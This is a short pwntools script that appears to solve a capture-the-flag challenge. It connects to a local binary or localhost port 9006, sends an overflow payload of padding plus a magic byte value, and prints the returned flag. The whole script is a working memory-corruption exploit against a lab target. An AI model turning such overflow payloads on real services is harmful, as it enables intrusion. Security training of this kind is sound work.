from pwn import *


def conn():
    if args.LOCAL:
        p = process("./chall")
        return p
    elif args.REMOTE:
        HOST, PORT = "localhost", 9006
        p = remote(HOST, PORT)
        return p
    else:
        exit(0)


def main():

    global p
    p = conn()

    payload = b"A" * (15 - len(b"4V\x12"))
    payload += b"\x124V"
    p.sendline(payload)
    flag = p.recv()
    print(flag)


if __name__ == "__main__":
    main()
